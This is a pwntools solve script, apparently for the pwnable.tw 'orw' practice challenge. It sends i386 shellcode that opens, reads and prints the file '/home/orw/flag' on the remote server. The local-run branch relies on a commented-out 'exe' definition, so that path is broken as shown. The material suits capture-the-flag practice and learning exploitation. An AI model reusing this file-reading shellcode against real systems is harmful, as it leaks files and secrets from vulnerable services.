
#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  10001
HOST = "chall.pwnable.tw"
# exe = context.binary = ELF('./orw', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

sc = asm('''
    push 26465
    push 1818636151
    push 1919889253
    push 1836017711
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 0x05
    int 0x80

    mov ebx, eax
    mov ecx, esp
    mov edx, 0x100
    mov eax, 0x03
    int 0x80

    mov ebx, 0x01
    mov eax, 0x04
    int 0x80

    ''', arch = 'i386')
p.sendafter(b"shellcode:", sc)

p.interactive()
